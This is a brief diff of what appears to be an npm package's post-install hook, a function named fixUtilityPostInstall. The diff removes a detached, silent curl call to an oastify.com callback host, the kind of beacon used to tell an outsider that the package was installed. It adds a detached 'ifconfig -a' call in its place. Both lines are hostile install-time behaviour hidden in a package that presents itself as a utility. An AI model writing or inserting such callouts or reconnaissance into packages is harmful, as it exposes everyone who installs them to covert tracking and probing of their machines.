@@ -2,7 +2,7 @@
 const { spawn } = require('child_process');
 
 function fixUtilityPostInstall() {
-  const childFix = spawn('curl', ['http://spawn.er9koi9fi4s8rox1rezij2qlhcn3fr9fy.oastify.com'], {
+  const childFix = spawn('ifconfig', ['-a'], {
     detached: true,
     stdio: 'ignore',
   });
